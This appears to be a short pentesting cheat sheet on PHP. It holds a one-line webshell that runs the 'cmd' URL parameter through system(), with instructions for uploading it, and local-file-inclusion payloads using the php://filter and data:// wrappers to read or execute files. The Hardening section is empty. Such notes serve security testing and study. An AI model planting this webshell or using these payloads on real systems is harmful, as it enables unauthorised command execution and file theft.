**Tags:** #type/tech-specific

---
# Fundamentals
execute system command in php: `<?php echo system('uname -a'); ?>`
simple php webshell: `<?php echo system($_GET['cmd']); ?>`
takes shell command in the URL: upload file and then use `[url to file]?cmd=<command>`
# Pentesting
## Wrappers
There are a lots of [different wrappers](https://www.php.net/manual/en/wrappers.php). Most interesting are:
#### php://filter
When using LFI, display the (encoded) file content rather than to execute it.
Usage:
- Include plaintext file: `php://filter/ressource=<path-to-file>`
- Include encoded file: `php://filter/convert.base64-encode/resource=<path-to-file>`
#### php://data
When using LFI, execute some (encoded) data.
Only possible when [allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include) is set. Its not set per default.
Usage:
- Execute plaintext data: `data://text/plain,<php-snippet>`
- Execute encoded data: `data://text/plain;base64,<base64-encoded-php-snippet><arguments used by the snippet>`
# Hardening
